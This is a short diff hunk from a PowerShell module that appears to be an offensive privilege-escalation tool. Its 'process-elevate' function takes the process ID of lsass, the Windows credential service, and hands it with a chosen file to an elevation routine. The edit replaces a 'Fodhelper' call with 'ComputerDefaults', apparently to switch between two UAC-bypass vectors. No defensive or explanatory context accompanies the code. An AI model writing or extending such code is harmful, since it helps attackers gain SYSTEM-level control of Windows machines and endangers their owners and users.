@@ -240,7 +240,7 @@ function process-elevate {
     )
     $Request =  $processName
 $IDPORT = (get-process lsass).Id
-Fodhelper -PID '$IDPORT' -File '$Request'
+ComputerDefaults -PID '$IDPORT' -File '$Request'
 }
 Export-ModuleMember -Function process-elevate
 Set-Alias -Name process-elevate -Value process-elevate
